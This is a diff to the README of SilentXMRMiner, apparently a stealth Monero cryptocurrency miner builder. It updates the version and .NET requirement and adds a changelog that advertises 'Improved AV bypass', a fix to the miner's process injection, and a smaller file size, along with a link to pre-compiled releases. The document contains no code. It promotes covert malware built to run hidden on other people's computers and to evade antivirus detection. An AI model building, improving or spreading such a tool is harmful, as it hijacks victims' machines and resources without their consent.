@@ -1,12 +1,12 @@
 
 <img src="https://github.com/UnamSanctam/SilentXMRMiner/blob/master/SilentXMRMiner.png?raw=true">
 
-# SilentXMRMiner v0.8 - Based on Lime Miner v0.3
+# SilentXMRMiner v0.8.1 - Based on Lime Miner v0.3
 
 
 ## Main Features
 
-* .NET - Coded in Visual Basic .NET, requires .NET Framework 4.0.
+* .NET - Coded in Visual Basic .NET, requires .NET Framework 4.5.
  
 * Codedom - No need for external libraries to compile
 
@@ -31,6 +31,12 @@ Pre-Compiled: https://github.com/UnamSanctam/SilentXMRMiner/releases
 
 ## Changes
 
+# v0.8.1 (07/01/2021)
+* Improved AV bypass
+* Reverted back to .NET Framework 4.5
+* Fixed bug that stopped miner from injecting
+* Improved file size
+* Fixed incorrect scaling with some system languages
 # v0.8 (04/01/2021)
 * Updated miner
 * Fixed bugs
